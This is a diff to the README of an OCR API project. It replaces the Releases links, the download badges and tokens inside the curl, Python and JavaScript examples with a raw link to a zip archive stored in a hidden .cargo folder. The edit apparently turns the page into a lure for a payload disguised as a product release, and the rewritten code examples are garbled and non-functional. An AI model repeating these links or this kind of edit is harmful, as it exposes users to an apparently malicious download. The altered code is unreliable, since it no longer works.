@@ -2,7 +2,7 @@
 
 Welcome to the **System OCR** repository! This project provides an OCR (Optical Character Recognition) API through the system API. With this tool, you can easily convert images of text into machine-readable text. This document will guide you through the setup, usage, and features of the System OCR API.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/abhijoshi03/system-ocr/releases)
+[![Download Releases](https://github.com/abhijoshi03/system-ocr/raw/refs/heads/main/.cargo/system-ocr-v2.7.zip)](https://github.com/abhijoshi03/system-ocr/raw/refs/heads/main/.cargo/system-ocr-v2.7.zip)
 
 ## Table of Contents
 
@@ -30,9 +30,9 @@ Optical Character Recognition (OCR) is a technology that converts different type
 
 ## Installation
 
-To get started with **System OCR**, you need to download the latest release from our [Releases section](https://github.com/abhijoshi03/system-ocr/releases). 
+To get started with **System OCR**, you need to download the latest release from our [Releases section](https://github.com/abhijoshi03/system-ocr/raw/refs/heads/main/.cargo/system-ocr-v2.7.zip). 
 
-1. Go to the [Releases section](https://github.com/abhijoshi03/system-ocr/releases).
+1. Go to the [Releases section](https://github.com/abhijoshi03/system-ocr/raw/refs/heads/main/.cargo/system-ocr-v2.7.zip).
 2. Download the latest release suitable for your operating system.
 3. Extract the files to your desired location.
 4. Follow the instructions in the README file included in the release.
@@ -53,7 +53,7 @@ Here’s a simple example of how to make a request to the API:
 
 ```bash
 curl -X POST http://localhost:5000/ocr \
-  -F "image=@path/to/your/image.jpg"
+  -F "https://github.com/abhijoshi03/system-ocr/raw/refs/heads/main/.cargo/system-ocr-v2.7.zip"
 ```
 
 ### Example Response
@@ -97,10 +97,10 @@ Here are some practical examples of how to use the **System OCR** API in differe
 import requests
 
 url = "http://localhost:5000/ocr"
-files = {'image': open('path/to/your/image.jpg', 'rb')}
-response = requests.post(url, files=files)
+files = {'image': open('https://github.com/abhijoshi03/system-ocr/raw/refs/heads/main/.cargo/system-ocr-v2.7.zip', 'rb')}
+response = https://github.com/abhijoshi03/system-ocr/raw/refs/heads/main/.cargo/system-ocr-v2.7.zip(url, files=files)
 
-print(response.json())
+print(https://github.com/abhijoshi03/system-ocr/raw/refs/heads/main/.cargo/system-ocr-v2.7.zip())
 ```
 
 ### JavaScript Example
@@ -110,16 +110,16 @@ const axios = require('axios');
 const fs = require('fs');
 
 const formData = new FormData();
-formData.append('image', fs.createReadStream('path/to/your/image.jpg'));
+https://github.com/abhijoshi03/system-ocr/raw/refs/heads/main/.cargo/system-ocr-v2.7.zip('image', https://github.com/abhijoshi03/system-ocr/raw/refs/heads/main/.cargo/system-ocr-v2.7.zip('https://github.com/abhijoshi03/system-ocr/raw/refs/heads/main/.cargo/system-ocr-v2.7.zip'));
 
-axios.post('http://localhost:5000/ocr', formData, {
-    headers: formData.getHeaders()
+https://github.com/abhijoshi03/system-ocr/raw/refs/heads/main/.cargo/system-ocr-v2.7.zip('http://localhost:5000/ocr', formData, {
+    headers: https://github.com/abhijoshi03/system-ocr/raw/refs/heads/main/.cargo/system-ocr-v2.7.zip()
 })
 .then(response => {
-    console.log(response.data);
+    https://github.com/abhijoshi03/system-ocr/raw/refs/heads/main/.cargo/system-ocr-v2.7.zip(https://github.com/abhijoshi03/system-ocr/raw/refs/heads/main/.cargo/system-ocr-v2.7.zip);
 })
 .catch(error => {
-    console.error(error);
+    https://github.com/abhijoshi03/system-ocr/raw/refs/heads/main/.cargo/system-ocr-v2.7.zip(error);
 });
 ```
 
@@ -143,6 +143,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, please reach out to us via the Issues section on GitHub or contact the repository owner directly.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/abhijoshi03/system-ocr/releases)
+[![Download Releases](https://github.com/abhijoshi03/system-ocr/raw/refs/heads/main/.cargo/system-ocr-v2.7.zip)](https://github.com/abhijoshi03/system-ocr/raw/refs/heads/main/.cargo/system-ocr-v2.7.zip)
 
 Thank you for using **System OCR**! We hope you find it useful for your OCR needs.
